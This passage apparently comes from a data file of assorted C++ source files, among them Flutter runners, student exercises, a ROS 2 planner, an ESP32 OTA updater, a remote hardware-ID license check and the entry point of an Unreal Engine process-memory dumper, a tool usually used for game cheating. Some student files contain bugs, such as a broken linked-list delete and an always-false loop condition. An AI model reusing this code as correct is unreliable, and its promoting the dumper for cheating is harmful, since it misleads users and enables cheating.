no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <stack>\n#include <string>\n\nbool StatementBalancedCheck(std::string statement) {\n    std::stack<char> ParenthesesCheck;\n\n    for (char parentheses : statement) {\n        if (parentheses == '(') {\n        // If an open parentheses is found, place it in the stack\n            ParenthesesCheck.push(parentheses);\n        }\n        else if (parentheses == ')') {\n            if (ParenthesesCheck.empty()) {\n                return false;\n        // If a close parentheses is found without an open parentheses in the stack, return that the statement is not balanced.\n            }\n            ParenthesesCheck.pop();\n        // If a close parentheses is found with an open parentheses in the stack, pop the open parentheses from the stack.\n        }\n    }\n    return ParenthesesCheck.empty();\n}\n\nint main() {\n    std::string statement;\n    std::cout << \"Enter a statement to balance: \";\n    std::cin >> statement;\n\n    //Requests a string to check for balanced parentheses.\n\n    if (StatementBalancedCheck(statement)) { // Checks if the provided sentence/string has a balanced amount of parentheses, then returns an output if it is or is not.\n        std::cout << \"Statement is balanced\\n\";\n    }\n    else {\n        std::cout << \"Statement is not balanced\\n\";\n    }\n}",
    "#include <iostream>\n#include <string>\nusing namespace std; \n\nstruct Node\n{\n\tint noMhs; \n\tstring name; \n\tNode* next; \n\tNode* prev; \n};\n\nNode *START = NULL;\n\nvoid addNode() {\n\tNode* newNode = new Node();  // step 1: create a new node \n\tcout << \"\\nEnter the roll number of the student: \";\n\tcin >> newNode->noMhs;  // Assign value to the data field of the new node \n\tcout << \"\\nEnter the name of the student: \";\n\tcin >> newNode->name;  //Assign value to the data field of the new node \n\n\n\t// Insert the new node in the list \n\tif (START == NULL || newNode->noMhs <= START->noMhs) { // step 2: insert the new node \n\n\t\tif (START != NULL && newNode->noMhs == START->noMhs) {\n\t\t\tcout << \"\\033[31Dumplicate roll numbers not allowed\\033[0m\" << endl;\n\t\t\treturn;\n\t\t}\n\t\t// if the list is empty, make the new node the START \n\t\tnewNode->next = START;  // step 3: make the new node point to the first node \n\t\tif (START != NULL) {\n\t\t\tSTART->prev = newNode; \t// STEP 4: make the first node point to the new node \n\n\t\t}\n\t\tnewNode->prev = NULL;\t// step 5: make the new node point to NULL\n\t\tSTART = newNode;\t\t// step 6: make the new node the first node \n\t}\n\telse {\n\t\t// insert the new node in the middle or at the end \n\t\tNode* current = START;  // step 1.a: start from the first node \n\t\tNode* previous = NULL;  // step 1.b: previous node is NULL initially \n\n\t\twhile (current != NULL && current->noMhs < newNode->noMhs) { // step 1.c: traverse \n\t\t\tprevious = current; // step 1.d: move the previous to the current node \n\t\t\tcurrent = current->next;  // step 1>e: move the current to the next node \n\t\t}\n\n\t\tnewNode->next = current; // step 4. Make the next field of the new node point\n\t\tnewNode->prev = previous; // step 5. make the previous field of the new node point \n\n\t\tif (current != NULL) {\n\t\t\tcurrent->prev = newNode; //step 6. Make the previous field of the current new node \n\t\t}\n\n\t\tif (previous != NULL) {\n\t\t\tprevious->next = newNode; // step 7. Make the next field of the previous node \n\t\t}\n\t\telse {\n\t\t\t// if previous is still NULL, it means newNode is now the first node \n\t\t\tSTART = newNode;\n\t\t}\n\t}\n}\nbool search(int rollNo, Node **previous, Node **current)\n{\n\t*previous = NULL;\n\t*current = START;\n\twhile (*current != NULL && (*current)->noMhs != rollNo)\n\t{\n\t\t*previous = *current;\n\t\t*current = (*current)->next;\n\t}\n\treturn (*current != NULL);\n}\n\nvoid deleteNode()\n{\n\tNode* previous, * current; // \n\tint rollNo;\n\n\tcout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n\tcin >> rollNo; // step 3: get the roll number to be deleted \n\n\tif (START == NULL)\n\t{\n\t\tcout << \"List is empty\" << endl;\n\t\treturn;\n\t}\n\n\tcurrent = START; // Step 1: start from the first node \n\tprevious = NULL;\n\n\t// Locate the node to be deleted \n\twhile (current != NULL && current->noMhs != rollNo)\n\t{\n\t\tprevious = current;\n\t\tcurrent = current->next;\n\t}\n\n\tif (current == NULL)\n\t{\n\t\tcout << \"\\033[31mthe record with roll number \" << rollNo << \" not found\\033[0m\" << endl;\n\t\treturn;\n\t}\n\n\t// Node to be deleted is the first node \n\tif (current == START)\n\t{\n\t\tSTART = START->next; //step 2: update the START pointer\n\t\tif (START != NULL)\n\t\t{\t\t\t\t\t\t//\n\t\t\tSTART->prev = NULL; // step \n\t\t}\n\t}\n\telse\n\t{ // Node to be deleted is not the first node \n\t\tprevious->next = current->prev;\n\t\tif (current->next != NULL)\n\t\t{ // If there's a successor, update its prev pointer \n\t\t\tcurrent->next->prev = previous;\n\t\t}\n\t}\n\n\t// Release the memory of the node marked as current \n\tdelete current;\n\tcout << \"\\x1b[32mRecord with roll number \" << rollNo << \" deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n\treturn (START == NULL);\n}\nvoid traverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl; \n\telse\n\t{\n\t\tcout << \"\\nRecords in asceding order of roll number are:\" << endl;\n\t\tNode* currentNode = START;  //step 1 \n\t\twhile (currentNode != NULL)\t//step 2\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl; //step 3\n\t\t\tcurrentNode = currentNode->next;\t\t\t\t\t\t\t\t// step 4\n\t\t}\n\t}\n}\nvoid revtraverse()\n{\n\n\tif (listEmpty())\n\t\tcout << \"\\nRecords in descending order of roll number are:\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecords im descending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode->next != NULL)\n\t\t\tcurrentNode = currentNode->next;\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->prev;\n\t\t}\n\n\t}\n}\n\nvoid searchData()\n{\n\tif (listEmpty() == true)\n\t{\n\t\tcout << \"\\nList is empty\" << endl;\n\t}\n\tNode* prev, *curr; \n\tprev = curr = NULL; \n\tcout << \"\\nEnter the roll number of the student whose record you want to seacrh: \"; \n\tint num; \n\tcin >> num; \n\tif (search(num, &prev, &curr) == false)\n\t\tcout << \"\\nRecord not found\" << endl; \n\telse\n\t{\n\t\tcout << \"\\nRecord found\" << endl; \n\t\tcout << \"\\nRoll number: \" << curr->noMhs << endl; \n\t\tcout << \"\\nName: \" << curr->name << endl; \n\t}\n}\nint main()\n{\n\twhile (true)\n\t{\n\t\ttry\n\t\t{\n\t\t\tcout << \"\\nMenu\" << endl;\n\t\t\tcout << \"1. Add a record to the list\" << endl;\n\t\t\tcout << \"",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"stdafx.h\"\n#include \"Anti Leak.h\"\n//#include <openssl/md5.h>\n#include <curl/curl.h>\n#include <sstream>\n#include <iostream>\n#include <vector>\n#pragma comment(lib, \"static-release-x86/libcurl_a.lib\")\nstatic size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)\n{\n\t((std::string*)userp)->append((char*)contents, size * nmemb);\n\treturn size * nmemb;\n}\n\nstd::vector<std::string> split(std::string strToSplit, char delimeter)\n{\n\tstd::stringstream ss(strToSplit);\n\tstd::string item;\n\tstd::vector<std::string> splittedStrings;\n\twhile (std::getline(ss, item, delimeter))\n\t{\n\t\tsplittedStrings.push_back(item);\n\t}\n\treturn splittedStrings;\n}\n\nstd::vector<std::string> split(std::string stringToBeSplitted, std::string delimeter)\n{\n\tstd::vector<std::string> splittedString;\n\tint startIndex = 0;\n\tint  endIndex = 0;\n\twhile ((endIndex = stringToBeSplitted.find(delimeter, startIndex)) < stringToBeSplitted.size())\n\t{\n\n\t\tstd::string val = stringToBeSplitted.substr(startIndex, endIndex - startIndex);\n\t\tsplittedString.push_back(val);\n\t\tstartIndex = endIndex + delimeter.size();\n\n\t}\n\tif (startIndex < stringToBeSplitted.size())\n\t{\n\t\tstd::string val = stringToBeSplitted.substr(startIndex);\n\t\tsplittedString.push_back(val);\n\t}\n\treturn splittedString;\n}\n//==============================================================\nbool cAL::Authenticated()\n{\n\tDWORD nSize;\n\tDWORD nSize2;\n\tint nSize3;\n\tDWORD lVolSerialNbr = 0;\n\n\tGetVolumeInformation(\"C:\\\\\", 0, 0, &lVolSerialNbr, 0, 0, 0, 0);\n\n\n\tDWORD HardWareID = lVolSerialNbr;\n\n\tint asdf = HardWareID;\n#define AddHWIDPerson(HWID)\\\n\tif(asdf == HWID)\\\n\t{\\\n\t\treturn true;\\\n\t}\n\n\tCURL *curl;\n\tCURLcode res;\n\tstd::string readBuffer;\n\n\tcurl = curl_easy_init();\n\tif (curl) {\n\t\tcurl_easy_setopt(curl, CURLOPT_URL, \"http://wakingbots.atwebpages.com/Clientes.txt\");\n\t\tcurl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);\n\t\tcurl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);\n\t\tres = curl_easy_perform(curl);\n\t\tcurl_easy_cleanup(curl);\n\t\tstd::size_t found = readBuffer.find(std::to_string(asdf));\n\t\tif (found != std::string::npos)\n\t\t\treturn true;\n\t}\n\t//AddHWIDPerson(-2035593796); //Victor\n\t//AddHWIDPerson(-31918725); //Billy\n\n\n\treturn false;\n}",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <time.h>\r\n\r\nusing namespace std;\r\n\r\nint karta()\r\n{\r\n\treturn rand() % 52 + 2;\r\n}\r\n\r\nbool czywylosowana(int tab[], int liczba, int dl)\r\n{\r\n\tint i = 0;\r\n\tdo\r\n\t{\r\n\t\tif (tab[i] == liczba)\r\n\t\t\treturn true;\r\n\t\ti++;\r\n\t} while (i < dl + 1);\r\n\treturn false;\r\n}\r\n\r\nvoid poczatek(int z[], int g[], int dl, int ilosc)\r\n{\r\n\tint s = 0;\r\n\tint i = 0;\r\n\tdo\r\n\t{\r\n\t\ts = karta();\r\n\t\tif (czywylosowana(z, s, dl) == false)\r\n\t\t{\r\n\t\t\tg[i] = s;\r\n\t\t\ti++;\r\n\t\t\tdl++;\r\n\t\t\tz[dl] = s;\r\n\t\t}\r\n\r\n\t} while (i < ilosc);\r\n}\r\n\r\nint kartapoczatkowa()\r\n{\r\n\tint s = 0;\r\n\ts = karta();\r\n\treturn s;\r\n}\r\n\r\nstring zamiana(int l)\r\n{\r\n\tstring figura = \" \";\r\n\tint dwa = l - 2;\r\n\tint trzy = l - 3;\r\n\tint piec = l - 5;\r\n\tif (dwa % 4 == 0 or dwa == 0)\r\n\t\tfigura = \"pik\";\r\n\tif (l % 4 == 0)\r\n\t\tfigura = \"karo\";\r\n\tif (trzy % 4 == 0 or trzy == 0)\r\n\t\tfigura = \"kier\";\r\n\tif (piec % 4 == 0 or piec == 0)\r\n\t\tfigura = \"trefl\";\r\n\treturn figura;\r\n}\r\n\r\nint zamiana2(int l, string z)\r\n{\r\n\tif (z == \"pik\")\r\n\t\tl = ((l - 2) / 4) + 2;\r\n\tif (z == \"kier\")\r\n\t\tl = ((l - 3) / 4) + 2;\r\n\tif (z == \"karo\")\r\n\t\tl = ((l - 4) / 4) + 2;\r\n\tif (z == \"trefl\")\r\n\t\tl = ((l - 5) / 4) + 2;\r\n\treturn l;\r\n}\r\n\r\nvoid runda(int tab[], int ilekart, string ksf, int ksc)\r\n{\r\n\tstring figura;\r\n\tint cyfra;\r\n\tfor (int i = 0; i < ilekart; i++)\r\n\t{\r\n\t\tcout << i + 1; cout << \". \";\r\n\t\tfigura = zamiana(tab[i]);\r\n\t\tcout << figura;\r\n\t\tcout << \" \";\r\n\t\tcyfra = zamiana2(tab[i], figura);\r\n\t\tif (cyfra == 11)\r\n\t\t\tcout << \"jopek\";\r\n\t\telse if (cyfra == 12)\r\n\t\t\tcout << \"dama\";\r\n\t\telse if (cyfra == 13)\r\n\t\t\tcout << \"krol\";\r\n\t\telse if (cyfra == 14)\r\n\t\t\tcout << \"as\";\r\n\t\telse\r\n\t\t\tcout << cyfra;\r\n\t\tif (figura == ksf or cyfra == ksc or cyfra == 12 or ksc == 12)\r\n\t\t\tcout << \" mozna zagrac\";\r\n\t\tcout << endl;\r\n\t}\r\n}\r\n\r\nvoid kns(string knf, int knc)\r\n{\r\n\tstring figura;\r\n\tint cyfra;\r\n\tfigura = knf;\r\n\tcout << figura;\r\n\tcout << \" \";\r\n\tcyfra = knc;\r\n\tif (cyfra == 11)\r\n\t\tcout << \"jopek\";\r\n\telse if (cyfra == 12)\r\n\t\tcout << \"dama\";\r\n\telse if (cyfra == 13)\r\n\t\tcout << \"krol\";\r\n\telse if (cyfra == 14)\r\n\t\tcout << \"as\";\r\n\telse\r\n\t\tcout << cyfra;\r\n}\r\n\r\nvoid draw(int z[], int g[], int dl, int ile, int iledobrac)\r\n{\r\n\tint s = 0;\r\n\tint i = 0;\r\n\tdo\r\n\t{\r\n\t\ts = karta();\r\n\t\tif (czywylosowana(z, s, dl) == false)\r\n\t\t{\r\n\t\t\tg[ile] = s;\r\n\t\t\ti++;\r\n\t\t\tz[dl] = s;\r\n\t\t}\r\n\r\n\t} while (i < iledobrac);\r\n}\r\n\r\n\r\nvoid play(int tab[], int k, string kf, int kc, int ilekartwrence)\r\n{\r\n\tbool y = false;\r\n\tdo\r\n\t{\r\n\t\tif (zamiana(tab[k]) == kf or zamiana2(tab[k], zamiana(tab[k])) == kc or zamiana2(tab[k], zamiana(tab[k])) == 12 or kc == 12)\r\n\t\t{\r\n\t\t\tkf = zamiana(tab[k]);\r\n\t\t\tkc = zamiana2(tab[k], zamiana(tab[k]));\r\n\t\t\tfor (int i = 0; i < ilekartwrence - 1; i++)\r\n\t\t\t{\r\n\t\t\t\tif (i >= k)\r\n\t\t\t\t{\r\n\t\t\t\t\ttab[i] = tab[i + 1];\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\ty = true;\r\n\t\t}\r\n\t\telse\r\n\t\t\tcout << \"nie mozesz zagrac tej karty\" << endl;\r\n\t} while (y = false);\r\n\r\n}\r\n\r\n\r\nint main()\r\n{\r\n\tint dlugosc = 0;\r\n\tint juzdobrane[52];\r\n\tint iloscgraczy = 0;\r\n\tbool czyokgraczy = false;\r\n\tint koniec = 0;\r\n\tbool makao1 = false; bool makao2 = false; bool makao3 = false; bool makao4 = false;\r\n\tint gracz1[52]; int gracz2[52]; int gracz3[52]; int gracz4[52];\r\n\tint kartanastole; string kartanastolefigura; int kartanastolecyfra;\r\n\tint zastepczacyfra; string zastepczafigura;\r\n\tint ilekartwrence1 = 5; int ilekartwrence2 = 5; int ilekartwrence3 = 5; int ilekartwrence4 = 5;\r\n\tstring dzialaniegracza;\r\n\tint ktorarunda = 1;\r\n\tint karta;\r\n\tsrand(time(NULL));\r\n\r\n\tdo\r\n\t{\r\n\t\tcout << \"podaj ilosc graczy od 2 do 4\" << endl;\r\n\t\tcin >> iloscgraczy;\r\n\t\tif (iloscgraczy == 2 or iloscgraczy == 3 or iloscgraczy == 4)\r\n\t\t{\r\n\t\t\tczyokgraczy = true;\r\n\t\t}\r\n\t} while (czyokgraczy == false);\r\n\tkoniec = iloscgraczy;\r\n\tsystem(\"cls\");\r\n\r\n\tdo\r\n\t{\r\n\t\tkartanastole = kartapoczatkowa();\r\n\t\tkartanastolefigura = zamiana(kartanastole);\r\n\t\tkartanastolecyfra = zamiana2(kartanastole, kartanastolefigura);\r\n\t} while (kartanastolecyfra > 10);\r\n\tjuzdobrane[0] = kartanastole;\r\n\r\n\tpoczatek(juzdobrane, gracz1, dlugosc, ilekartwrence1);\r\n\tdlugosc += 5;\r\n\tpoczatek(juzdobrane, gracz2, dlugosc, ilekartwrence2);\r\n\tdlugosc += 5;\r\n\tif (iloscgraczy == 3 or iloscgraczy == 4)\r\n\t{\r\n\t\tpoczatek(juzdobrane, gracz3, dlugosc, ilekartwrence3);\r\n\t\tdlugosc += 5;\r\n\t}\r\n\tif (iloscgraczy == 4)\r\n\t{\r\n\t\tpoczatek(juzdobrane, gracz4, dlugosc, ilekartwrence4);\r\n\t\tdlugosc += 5;\r\n\t}\r\n\r\n\r\n\tdo\r\n\t{\r\n\t\tbool y = false;\r\n\t\tif (makao1 == false && ilekartwrence1 == 1)\r\n\t\t{\r\n\r\n\t\t\tfor (int i = 0; i <= 5; i++)\r\n\t\t\t{\r\n\t\t\t\tdraw(juzdobrane, gracz1, dlugosc, ilekartwrence1, 1);\r\n\t\t\t\tilekartwrence1 += 1;\r\n\t\t\t\tdlugosc += 1;\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t\tif (makao2 == false && ilekartwrence2 == 1)\r\n\t\t{\r\n\r\n\t\t\tfor (int i = 0; i <= 5; i++)\r\n\t\t\t{\r\n\t\t\t\tdraw(juzdobrane, gracz2, dlugosc, ilekartwrence2, 1);\r\n\t\t\t\tilekartwrence2 += 1;\r\n\t\t\t\tdlugosc += 1;\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t\tif (makao3 == false && ilekartwrence3 == 1)\r\n\t\t{\r\n\t\t\tfor (int i = 0; i <= 5; i++)\r\n\t\t\t{\r\n\t\t\t\tdraw(juzdobrane, gracz3, dlugosc, ilekartwrence3, 5);\r\n\t\t\t\tilekartwrence3 += 5;\r\n\t\t\t\tdlugosc += 5;\r\n\t\t\t}\r\n\t\t}\r\n\t\tif (makao4 == false && ilekartwrence4 == 1)\r\n\t\t{",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"destinichallenge\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <geometry_msgs/msg/twist.hpp>\n#include <rclcpp/rclcpp.hpp>\n#include <traffic_management_system/msg/robot_details.hpp>\n\nclass RobotPlanner : public rclcpp::Node {\n public:\n  RobotPlanner() : Node(\"robot_planner\") {\n    subscription_ =\n        this->create_subscription<traffic_management_system::msg::RobotDetails>(\n            \"/robot_details\", 10,\n            std::bind(&RobotPlanner::robotDetailsCallback, this,\n                      std::placeholders::_1));\n\n    robot1_cmd_vel_publisher_ =\n        this->create_publisher<geometry_msgs::msg::Twist>(\"/tb3_0/cmd_vel\", 10);\n\n    robot2_cmd_vel_publisher_ =\n        this->create_publisher<geometry_msgs::msg::Twist>(\"/tb3_1/cmd_vel\", 10);\n  }\n\n private:\n  void robotDetailsCallback(\n      const traffic_management_system::msg::RobotDetails::SharedPtr msg) {\n    std::string robot_name = msg->robot_name;\n    bool robot_in_junction = msg->in_junction;\n\n    bool prev_robot_in_junction = robots_status_[robot_name];\n\n    robots_status_[robot_name] = robot_in_junction;\n\n    if (robots_status_[\"robot_1\"] && robots_status_[\"robot_2\"]) {\n      if (robot_in_junction != prev_robot_in_junction) {\n        if (robot_name == \"robot_1\") {\n          stopRobot(\"robot_1\");\n        }\n\n        else if (robot_name == \"robot_2\") {\n          stopRobot(\"robot_2\");\n        }\n      }\n    }\n  }\n\n  void stopRobot(const std::string& robot_name) {\n    geometry_msgs::msg::Twist stop_cmd_vel;\n    stop_cmd_vel.linear.x = 0.0;\n    stop_cmd_vel.angular.z = 0.0;\n\n    RCLCPP_INFO(this->get_logger(), \"%s cmd_vel: linear = %f, angular = %f\",\n                robot_name.c_str(), stop_cmd_vel.linear.x,\n                stop_cmd_vel.angular.z);\n\n    if (robot_name == \"robot_1\") {\n      robot1_cmd_vel_publisher_->publish(stop_cmd_vel);\n    }\n\n    else if (robot_name == \"robot_2\") {\n      robot2_cmd_vel_publisher_->publish(stop_cmd_vel);\n    }\n  }\n\n  rclcpp::Subscription<traffic_management_system::msg::RobotDetails>::SharedPtr\n      subscription_;\n  rclcpp::Publisher<geometry_msgs::msg::Twist>::SharedPtr\n      robot1_cmd_vel_publisher_;\n\n  rclcpp::Publisher<geometry_msgs::msg::Twist>::SharedPtr\n      robot2_cmd_vel_publisher_;\n\n  std::unordered_map<std::string, bool> robots_status_;\n\n  geometry_msgs::msg::Twist robot_1_cmd_vel_;\n  geometry_msgs::msg::Twist robot_2_cmd_vel_;\n};\n\nint main(int argc, char** argv) {\n  rclcpp::init(argc, argv);\n  auto node = std::make_shared<RobotPlanner>();\n  rclcpp::spin(node);\n  rclcpp::shutdown();\n  return 0;\n}\n\n// One case: If both are entering at the same time?",
    "#include <fmt/core.h>\n#include \"dumper.h\"\n#include \"utils.h\"\n#include \"locale.h\"\n\nint main(int argc, char* argv[])\n{\n    uint64 start;\n    uint64 end;\n    uint64 time;\n\n    setlocale(LC_ALL, \"en_US.UTF-8\");\n\n    auto dumper = Dumper::GetInstance();\n\n    start = GetTime();\n    switch (dumper->Init(argc, argv))\n    {\n    case STATUS::WINDOW_NOT_FOUND: { puts(\"Can't find UE4 window\"); return 1; }\n    case STATUS::PROCESS_NOT_FOUND: { puts(\"Can't find process\"); return 1; }\n    case STATUS::READER_ERROR: { puts(\"Can't init reader\"); return 1; }\n    case STATUS::CANNOT_GET_PROCNAME: { puts(\"Can't get process name\"); return 1; }\n    case STATUS::ENGINE_NOT_FOUND: { puts(\"Can't find offsets for this game\"); return 1; }\n    case STATUS::ENGINE_FAILED: { puts(\"Can't init engine for this game\"); return 1; }\n    case STATUS::MODULE_NOT_FOUND: { puts(\"Can't enumerate modules (protected process?)\"); return 1; }\n    case STATUS::CANNOT_READ: { puts(\"Can't read process memory\"); return 1; }\n    case STATUS::INVALID_IMAGE: { puts(\"Can't get executable sections\"); return 1; }\n    case STATUS::SUCCESS: { break; };\n    default: { return 1; }\n    }\n    end = GetTime();\n    time = (end - start) / 10000;\n    fmt::print(\"Init time: {} ms\\n\", time);\n\n    start = GetTime();\n    switch (dumper->Dump())\n    {\n    case STATUS::FILE_NOT_OPEN: { puts(\"Can't open file\"); return 1; }\n    case STATUS::ZERO_PACKAGES: { puts(\"Size of packages is zero\"); return 1; }\n    case STATUS::SUCCESS: { break; }\n    default: { return 1; }\n    }\n    end = GetTime();\n    time = (end - start) / 10000;\n    fmt::print(\"Dump time: {} ms\\n\", time);\n\n    return 0;\n}\n",
    "#include <BLEDevice.h>\n#include <BLEServer.h>\n#include <BLEUtils.h>\n#include <BLE2902.h>\n#include \"soc/soc.h\"\n#include \"soc/rtc_cntl_reg.h\"\n\n#include <Update.h>\n\n#include <ArduinoJson.h>\n\n#include <LittleFS.h>\n\n#include <OTA_Update_.h>\n\n\n// Callback for handling data received on the RX characteristic\nint SEGMENT = 0;\nint FULL_PACKAGE = 0;\nint SIZE_OTA = 0;\nbool isUpdate = false;\nString msg_status = \"\";\nbool status_update = false;\n\n// Define the BLE Service and Characteristics\nBLEServer* pServer = NULL;\nBLECharacteristic* pCharacteristicRX = NULL;\nBLECharacteristic* pCharacteristicTX = NULL;\n\n// Characteristic UUIDs\nstatic BLEUUID serviceUUID(\"4fafc201-1fb5-459e-8fcc-c5c9c331914b\");\nstatic BLEUUID charUUID_RX(\"beb5483e-36e1-4688-b7f5-ea07361b26a8\");\nstatic BLEUUID charUUID_TX(\"e32d6400-0a1c-43af-a591-8634cc4b7af4\");\n\nbool deviceConnected = false;\nbool oldDeviceConnected = false;\n\n// Callback for receiving data from the central device\nclass MyServerCallbacks : public BLEServerCallbacks {\n    void onConnect(BLEServer* pServer) {\n        deviceConnected = true;\n    }\n\n    void onDisconnect(BLEServer* pServer) {\n        deviceConnected = false;\n        isUpdate = false;\n        ESP.restart();\n    }\n};\n\nconst String generateJsonString() {\n    DynamicJsonDocument jsonDoc(256);\n    jsonDoc[\"Segment\"] = SEGMENT;\n    jsonDoc[\"ota_size\"] = SIZE_OTA;\n    jsonDoc[\"msg_status\"] = msg_status;\n    jsonDoc[\"Total_byte\"] = LittleFS.totalBytes();\n    jsonDoc[\"Use_byte\"] = LittleFS.usedBytes();\n\n    String jsonString;\n    serializeJson(jsonDoc, jsonString);\n    return jsonString;\n}\n\nvoid performUpdate(Stream &updateSource, size_t updateSize) {\n  if (Update.begin(updateSize)) {\n    size_t written = Update.writeStream(updateSource);\n    if (written == updateSize) {\n      Serial.println(\"Written : \" + String(written) + \" successfully\");\n    }\n    else {\n      Serial.println(\"Written only : \" + String(written) + \"/\" + String(updateSize) + \". Retry?\");\n    }\n    msg_status = \"Written : \" + String(written) + \"/\" + String(updateSize) + \" [\" + String((written / updateSize) * 100) + \"%] \\n\";\n    if (Update.end()) {\n      Serial.println(\"OTA done!\");\n      msg_status = \"OTA Done: \";\n      if (Update.isFinished()) {\n        Serial.println(\"Update successfully completed. Rebooting...\");\n        status_update = true;\n        msg_status = \"Success!\\n\";\n      }\n      else {\n        Serial.println(\"Update not finished? Something went wrong!\");\n        msg_status = \"Failed!\\n\";\n      }\n\n    }\n    else {\n      Serial.println(\"Error Occurred. Error #: \" + String(Update.getError()));\n      msg_status = \"Error #: \" + String(Update.getError());\n    }\n  }\n  else\n  {\n    Serial.println(\"Not enough space to begin OTA\");\n    msg_status = \"Not enough space for OTA\";\n  }\n}\n\nvoid updateFromFS(fs::FS &fs) {\n  File updateBin = fs.open(\"/firmware.bin\");\n  if (updateBin) {\n    if (updateBin.isDirectory()) {\n      Serial.println(\"Error, update.bin is not a file\");\n      updateBin.close();\n      return;\n    }\n\n    size_t updateSize = updateBin.size();\n\n    if (updateSize > 0) {\n      Serial.println(\"Trying to start update\");\n      performUpdate(updateBin, updateSize);\n    }\n    else {\n      Serial.println(\"Error, file is empty\");\n    }\n\n    updateBin.close();\n\n    // when finished remove the binary from spiffs to indicate end of the process\n    Serial.println(\"Removing update file\");\n    fs.remove(\"/firmware.bin\");\n  }\n  else {\n    Serial.println(\"Could not load update.bin from spiffs root\");\n  }\n}\n\nclass MyCallbacks : public BLECharacteristicCallbacks {\n  void onWrite(BLECharacteristic *pCharacteristic) {\n    std::string rxValue = pCharacteristic->getValue();\n    int len = rxValue.length();\n    uint8_t* data = pCharacteristic->getData();\n\n    if (deviceConnected) {\n      if (SEGMENT > 0) {\n        File file = LittleFS.open(\"/firmware.bin\", \"ab\");  // Open file in append mode\n        if (!file) {\n          Serial.println(\"Failed to open file for writing\");\n          return;\n        }\n        //\n        isUpdate = true;\n\n        size_t bytesWritten = file.write(data, len);  // Use write method to write binary data\n        if (bytesWritten == len) {\n          // Print a message indicating successful data write\n          msg_status = \"Data written 